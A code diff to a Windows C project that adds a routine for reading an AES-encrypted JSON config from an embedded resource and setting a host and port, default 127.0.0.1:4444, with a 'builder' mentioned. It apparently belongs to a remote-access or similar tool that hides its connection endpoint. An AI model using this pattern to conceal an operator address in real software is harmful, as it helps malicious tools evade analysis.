@@ -1,5 +1,6 @@
 #include "utils.h"
 #include "cJSON.h"
+#include "config.h"
 #include <wincrypt.h>
 #include <bcrypt.h>
 #include <ctype.h>
@@ -286,4 +287,70 @@ void get_formatted_time(unsigned long long secs, char* out_buf) {
         month++;
     }
     sprintf(out_buf, "%02llu.%02llu.%llu %02llu:%02llu", days + 1, month, year, hour, minute);
+}
+
+char g_host[256] = "127.0.0.1";
+int g_port = 4444;
+
+void load_config_from_resource() {
+    HRSRC hResInfo = FindResource(NULL, MAKEINTRESOURCE(CONFIG_RES_ID), RT_RCDATA);
+    if (!hResInfo) return;
+
+    HGLOBAL hResData = LoadResource(NULL, hResInfo);
+    if (!hResData) return;
+
+    DWORD size = SizeofResource(NULL, hResInfo);
+    unsigned char* data = (unsigned char*)LockResource(hResData);
+    if (!data || size < 16) return;
+
+    unsigned char marker[16];
+    SET_MARKER(marker);
+
+    if (memcmp(data, marker, 16) != 0) return;
+
+    unsigned char* encrypted = data + 16;
+    DWORD encrypted_len = size - 16;
+
+    BCRYPT_ALG_HANDLE hAlg = NULL;
+    BCRYPT_KEY_HANDLE hKey = NULL;
+    DWORD cbKeyObject = 0, cbResult = 0, cbPlain = 0;
+    PBYTE pbKeyObject = NULL, pbPlain = NULL;
+
+    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return;
+    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;
+
+    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
+    pbKeyObject = (PBYTE)malloc(cbKeyObject);
+    if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)CONFIG_ENCRYPTION_KEY, 32, 0) != 0) goto cleanup;
+
+    BYTE iv[16];
+    memcpy(iv, CONFIG_ENCRYPTION_IV, 16);
+
+    // Decrypt without padding since we pad with zeros in builder
+    if (BCryptDecrypt(hKey, encrypted, encrypted_len, NULL, iv, 16, NULL, 0, &cbPlain, 0) != 0) goto cleanup;
+    pbPlain = malloc(cbPlain + 1);
+    memcpy(iv, CONFIG_ENCRYPTION_IV, 16);
+    if (BCryptDecrypt(hKey, encrypted, encrypted_len, NULL, iv, 16, pbPlain, cbPlain, &cbResult, 0) != 0) goto cleanup;
+
+    pbPlain[cbResult] = 0;
+
+    cJSON* root = cJSON_Parse((char*)pbPlain);
+    if (root) {
+        cJSON* ip = cJSON_GetObjectItem(root, "ip");
+        cJSON* port = cJSON_GetObjectItem(root, "port");
+        if (ip && ip->valuestring) {
+            strncpy(g_host, ip->valuestring, sizeof(g_host) - 1);
+            g_host[sizeof(g_host) - 1] = 0;
+        }
+        if (port && port->type == cJSON_Number) {
+            g_port = port->valueint;
+        }
+        cJSON_Delete(root);
+    }
+
+cleanup:
+    if (pbPlain) free(pbPlain);
+    if (hKey) BCryptDestroyKey(hKey);
+    if (pbKeyObject) free(pbKeyObject);
+    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
 }
